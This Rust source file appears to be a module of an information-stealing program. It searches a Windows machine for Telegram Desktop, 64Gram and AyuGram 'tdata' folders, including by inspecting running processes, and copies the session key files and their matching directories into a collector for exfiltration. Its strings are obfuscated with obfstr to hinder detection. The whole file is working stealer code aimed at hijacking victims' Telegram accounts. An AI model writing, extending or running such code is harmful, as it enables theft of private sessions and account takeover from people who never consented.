use alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::{format, vec};
use collector::{Collector, Software};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, FileSystemExt, copy_file, copy_folder};
use obfstr::obfstr as s;
use tasks::Task;
use utils::process::{ProcessInfo, get_process_list, get_process_path_by_pid};

pub(super) struct TelegramTask;

macro_rules! find_first_process {
    (
        $client_name:expr,
        $processes:expr => $($process_name:expr),+ $(,)? => $extend:expr
    ) => {
        #[allow(unused_assignments)]
        {
            let mut found = false;
            $(
                if !found {
                    if let Some(path) = find_process_path(obfstr::obfstr!($process_name), $processes)
                        && let Some(path) = path.parent()
                    {
                        $extend.extend([(obfstr::obfstr!($client_name).to_owned(), path / "tdata")]);
                        found = true;
                    }
                }
            )+
        }
    };
}

impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let appdata = &Path::appdata();
        let mut paths = vec![
            (
                s!("Telegram Desktop").to_owned(),
                appdata / s!("Telegram Desktop") / s!("tdata"),
            ),
            (
                s!("64Gram Desktop").to_owned(),
                appdata / s!("64Gram Desktop") / s!("tdata"),
            ),
        ];

        let processes = &get_process_list();

        find_first_process!("AyuGram", processes => "AyuGram.exe" => paths);

        for (client, tdata_path) in paths {
            if StorageFileSystem.is_exists(&tdata_path) {
                let dst = parent / client;
                copy_tdata(&tdata_path, filesystem, &dst, collector);
            }
        }
    }
}

fn find_process_path(process_name: &str, processes: &[ProcessInfo]) -> Option<Path> {
    let pid = processes
        .iter()
        .find(|process| process.name == Arc::from(process_name))?
        .pid;

    get_process_path_by_pid(pid)
}

fn copy_tdata<C, F>(tdata: &Path, dst_filesystem: &F, dst: &Path, collector: &C)
where
    C: Collector,
    F: FileSystem,
{
    if !StorageFileSystem.is_exists(tdata / s!("key_datas")) {
        return;
    }

    let mut contents = vec![];
    let mut files = vec![];
    let mut dirs = vec![];

    if let Some(list_files) = StorageFileSystem.list_files(tdata) {
        for path in list_files {
            if StorageFileSystem.is_file(&path) {
                files.push(path);
            } else if StorageFileSystem.is_dir(&path) {
                dirs.push(path);
            }
        }
    }

    for file in &files {
        for dir in &dirs {
            if let Some(dir_name) = dir.name()
                && let Some(file_name) = file.name()
                && format!("{dir_name}s") == file_name
            {
                contents.push(file);
                contents.push(dir);
            }
        }
    }

    if !contents.is_empty() {
        collector.get_software().set_telegram();
    }

    for path in contents {
        if StorageFileSystem.is_file(path) {
            let _ = copy_file(StorageFileSystem, path, dst_filesystem, dst, true);
        } else if StorageFileSystem.is_dir(path) {
            let _ = copy_folder(StorageFileSystem, path, dst_filesystem, dst);
        }
    }
}
